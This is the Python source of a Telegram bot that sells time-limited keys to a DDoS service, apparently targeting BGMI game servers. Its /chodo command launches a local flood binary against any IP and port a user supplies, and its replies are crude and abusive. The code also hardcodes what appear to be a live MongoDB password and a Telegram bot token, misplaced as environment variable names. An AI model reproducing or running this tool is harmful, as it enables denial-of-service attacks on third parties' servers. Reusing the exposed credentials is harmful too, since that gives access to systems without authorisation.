import telebot
import subprocess
import threading
import os
import signal
import copy
import random
import string
import re
from datetime import datetime, timedelta
from pymongo import MongoClient
import time

MONGO_URL = os.environ.get("mongodb+srv://loomjoom07_db_user:nana12@cluster0.ietahh1.mongodb.net/?appName=Cluster0", "")
BOT_TOKEN = os.environ.get("8026059055:AAE9J_EvjCE2ZVAiHSpexWgpobd-iKAzirU", "")

if not MONGO_URL or not BOT_TOKEN:
    print("Error: Please set MONGO_URL and BOT_TOKEN environment variables")
    exit(1)

db = MongoClient(MONGO_URL)["bot"]
users_collection = db["users"]
keys_collection = db["keys"]
settings_collection = db["settings"]

from keep_alive import keep_alive
keep_alive()

BOT_OWNER = 7646520243

bot = telebot.TeleBot(BOT_TOKEN)

ALLOWED_GROUPS = {"-1002382674139"}

REQUIRED_CHANNELS = ["@BADMOSH10"]

feedback_pending = {}

attack_processes = {}

attack_owners = {}

attack_running = False

def generate_key(length=16):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def has_valid_key(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return False
    
    if user.get("key_expiry"):
        expiry = user["key_expiry"]
        if isinstance(expiry, str):
            expiry = datetime.fromisoformat(expiry)
        if datetime.now() > expiry:
            users_collection.update_one(
                {"user_id": user_id},
                {"$unset": {"key": "", "key_expiry": ""}}
            )
            return False
        return True
    return False

def get_time_remaining(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if not user or not user.get("key_expiry"):
        return "0 days 0 hours 0 minutes 0 seconds"
    
    expiry = user["key_expiry"]
    if isinstance(expiry, str):
        expiry = datetime.fromisoformat(expiry)
    
    remaining = expiry - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 days 0 hours 0 minutes 0 seconds"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days} days {hours} hours {minutes} minutes {seconds} seconds"

def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

def get_group_admins(group_id):
    admins = []
    try:
        members = bot.get_chat_administrators(group_id)
        for member in members:
            admins.append(member.user.id)
    except Exception as e:
        print(f"Error getting admins: {e}")
    return admins

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key generate kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /gen <duration>\n\nFormat:\n• s = seconds (e.g., 30s)\n• m = minutes (e.g., 5m)\n• h = hours (e.g., 2h)\n• d = days (e.g., 7d)\n\nExamples:\n• /gen 30s - 30 seconds\n• /gen 5m - 5 minutes\n• /gen 2h - 2 hours\n• /gen 7d - 7 days")
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        bot.reply_to(message, "❌ Invalid duration format!\n\nFormat:\n• s = seconds (e.g., 30s)\n• m = minutes (e.g., 5m)\n• h = hours (e.g., 2h)\n• d = days (e.g., 7d)")
        return
    
    key = f"BGMI-{generate_key(12)}"
    
    keys_collection.insert_one({
        "key": key,
        "duration": duration.total_seconds(),
        "duration_label": duration_label,
        "created_at": datetime.now(),
        "created_by": user_id,
        "used": False,
        "used_by": None
    })
    
    bot.reply_to(message, f"✅ Key Generated Successfully!\n\n🔑 Key: `{key}`\n⏰ Duration: {duration_label}\n\nShare this key with user to redeem.", parse_mode="Markdown")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    if has_valid_key(user_id):
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"❌ Tumhare paas already ek valid key hai!\n\n⏰ Time Remaining: {remaining}\n\nUse /mykey to check details.")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>\n\nExample: /redeem BGMI-XXXXXX")
        return
    
    key_input = command_parts[1].upper()
    
    key_doc = keys_collection.find_one({"key": key_input})
    
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key! Key nahi mili.")
        return
    
    if key_doc.get("used"):
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    
    duration_seconds = key_doc["duration"]
    expiry_time = datetime.now() + timedelta(seconds=duration_seconds)
    
    users_collection.update_one(
        {"user_id": user_id},
        {
            "$set": {
                "user_id": user_id,
                "username": user_name,
                "key": key_input,
                "key_expiry": expiry_time,
                "redeemed_at": datetime.now()
            }
        },
        upsert=True
    )
    
    keys_collection.update_one(
        {"key": key_input},
        {
            "$set": {
                "used": True,
                "used_by": user_id,
                "used_at": datetime.now()
            }
        }
    )
    
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"✅ Key Redeemed Successfully!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {remaining}\n\nAb tum /chodo command use kar sakte ho!", parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    user_id = message.from_user.id
    
    user = users_collection.find_one({"user_id": user_id})
    
    if not user or not user.get("key"):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!\n\nKey lene ke liye @BADMOSH_X_GYRANGE se contact karo.")
        return
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhari key expire ho gayi hai!\n⏳ Remaining: 0 days 0 hours 0 minutes 0 seconds\n\nNayi key lene ke liye @BADMOSH_X_GYRANGE se contact karo.")
        return
    
    remaining = get_time_remaining(user_id)
    
    bot.reply_to(message, f"🔑 Your Key Details:\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n\n✅ Status: Active", parse_mode="Markdown")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key delete kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>\n\nExample: /delkey BGMI-XXXXXX")
        return
    
    key_input = command_parts[1].upper()
    
    result = keys_collection.delete_one({"key": key_input})
    
    if result.deleted_count > 0:
        users_collection.update_many(
            {"key": key_input},
            {"$unset": {"key": "", "key_expiry": ""}}
        )
        bot.reply_to(message, f"✅ Key `{key_input}` successfully delete ho gayi!", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi keys dekh sakta hai!")
        return
    
    unused_keys = list(keys_collection.find({"used": False}))
    used_keys = list(keys_collection.find({"used": True}))
    
    response = "📋 KEY LIST:\n\n"
    
    if unused_keys:
        response += "🟢 UNUSED KEYS:\n"
        for key in unused_keys:
            response += f"• `{key['key']}` ({key['duration_label']})\n"
    else:
        response += "🟢 UNUSED KEYS: None\n"
    
    response += "\n"
    
    if used_keys:
        response += "🔴 USED KEYS:\n"
        for key in used_keys[:10]:
            response += f"• `{key['key']}` (by {key.get('used_by', 'Unknown')})\n"
        if len(used_keys) > 10:
            response += f"... and {len(used_keys) - 10} more\n"
    else:
        response += "🔴 USED KEYS: None\n"
    
    response += f"\n📊 Total: {len(unused_keys)} unused, {len(used_keys)} used"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi users dekh sakta hai!")
        return
    
    users = list(users_collection.find({"key": {"$exists": True}}))
    
    if not users:
        bot.reply_to(message, "📋 No active users with keys!")
        return
    
    response = "👥 ACTIVE USERS WITH KEYS:\n\n"
    
    for i, user in enumerate(users[:20], 1):
        expiry = user.get("key_expiry")
        if isinstance(expiry, str):
            expiry = datetime.fromisoformat(expiry)
        
        status = "✅ Active" if expiry and expiry > datetime.now() else "❌ Expired"
        response += f"{i}. {user.get('username', 'Unknown')} ({user['user_id']})\n   Key: `{user['key'][:10]}...` | {status}\n\n"
    
    if len(users) > 20:
        response += f"... and {len(users) - 20} more users"
    
    response += f"\n📊 Total Active Users: {len(users)}"
    
    bot.reply_to(message, response, parse_mode="Markdown")

def start_attack(target, port, duration, message):
    global attack_running
    try:
        user_id = message.from_user.id
        chat_id = str(message.chat.id)

        feedback_pending[user_id] = True
        bot.reply_to(message, f"✅ Chudai started on {target}:{port} for {duration} seconds. \n Send FEEDBACK \n \n DDos Na lge ya use stop krna ho tab use /ruko")

        attack_command = f"{os.path.abspath('./adarsh')} {target} {port} {duration} 900"
        process = subprocess.Popen(attack_command, shell=True, preexec_fn=os.setsid)

        attack_processes[chat_id] = process
        attack_owners[chat_id] = user_id  
        attack_running = True

        process.wait()

        bot.reply_to(message, f"✅ Chudai completed on {target}:{port} for {duration} seconds.")

        attack_processes.pop(chat_id, None)
        attack_owners.pop(chat_id, None)
        attack_running = False

    except Exception as e:
        bot.reply_to(message, f"❌ Error while starting attack: {e}")
        attack_running = False

@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    global attack_running
    user_id = message.from_user.id
    chat_id = str(message.chat.id)

    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ Group me USE kr idhar MAA kiu Chudane Aya hai.")
        return

    if not is_member(user_id):
        bot.reply_to(message, f"❌ You must join [BADMOSH10](https://t.me/BADMOSH10) before using this command.", parse_mode="Markdown")
        return

    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key redeem karne ke liye: /redeem <key>\n💵 Key kharidne ke liye: @BADMOSH_X_GYRANGE")
        return

    if feedback_pending.get(user_id, False):
        bot.reply_to(message, "❌ Pehle apna feedback (SCREENSHOT) do, tabhi agla chudai kar sakte ho! 📸")
        return

    if attack_running:
        bot.reply_to(message, "❌ Ek waqt pe sirf ek hi chudai ho sakti hai! Pehle wali khatam hone do ya /ruko karo.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <target> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    try:
        port = int(port)
        duration = int(duration)

        group_admins = get_group_admins(chat_id)

        if user_id in group_admins:
            max_duration = 240
        else:
            max_duration = 120

        if duration > max_duration:
            bot.reply_to(message, f"❌ Error: Aapke liye maximum time {max_duration} seconds hai.")
            return

        message_copy = copy.deepcopy(message)

        thread = threading.Thread(target=start_attack, args=(target, port, duration, message_copy))
        thread.start()

    except ValueError:
        bot.reply_to(message, "❌ Error: Port and time must be numbers.")

@bot.message_handler(commands=["ruko"])
def stop_attack(message):
    global attack_running
    user_id = message.from_user.id
    chat_id = str(message.chat.id)

    group_admins = get_group_admins(chat_id)

    if user_id in group_admins or user_id == BOT_OWNER:
        if chat_id in attack_processes:
            process = attack_processes[chat_id]
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGINT)
                bot.reply_to(message, "🛑 attack rok diya gaya admin ke dwara!")

                attack_processes.pop(chat_id, None)
                attack_owners.pop(chat_id, None)
                attack_running = False

            except Exception as e:
                bot.reply_to(message, f"❌ Error stopping attack: {e}")
        else:
            bot.reply_to(message, "❌ Koi active attack nahi mila!")
    else:
        bot.reply_to(message, "❌ Sirf group admin ya bot admin hi attack rok sakte hai!")

@bot.message_handler(content_types=["photo"])
def handle_photo_feedback(message):
    user_id = message.from_user.id
    if feedback_pending.get(user_id, False):
        feedback_pending[user_id] = False
        bot.reply_to(message, "✅ Feedback received! Ab dobara chudai kar sakte ho lekin old ya faltu photo bheje to tumhe warn ⚠️ ya direct BAN bhi mil sakta hai 😎")

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = message.from_user.id
    
    help_text = '''
🔐 KEY SYSTEM COMMANDS:
💥 /redeem <key> : Key redeem karo
💥 /mykey : Apni key details dekho

⚔️ ATTACK COMMANDS:
💥 /chodo : BGMI WALO KI MAA KO CHODO 🥵
💥 /ruko : CHUDAI rokne ke liye
'''
    
    if is_owner(user_id):
        help_text += '''
👑 ADMIN COMMANDS:
💥 /gen <time> : Generate key (e.g., /gen 30s, /gen 5m, /gen 2h, /gen 7d)
💥 /delkey <key> : Delete a key
💥 /allkeys : List all keys
💥 /allusers : List all users with keys
'''
    
    help_text += '''
Regards :- @BADMOSH_X_GYRANGE  
Official Channel :- https://t.me/BADMOSH10
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''☠️ Gyrange ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.

🔐 KEY COMMANDS:
• /redeem <key> - Key redeem karo
• /mykey - Apni key details dekho

🤗 Try To Run This Command : /help 
💵 BUY :- @BADMOSH_X_GYRANGE'''
    bot.reply_to(message, response)

print("Bot is starting...")
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Error: {e}")
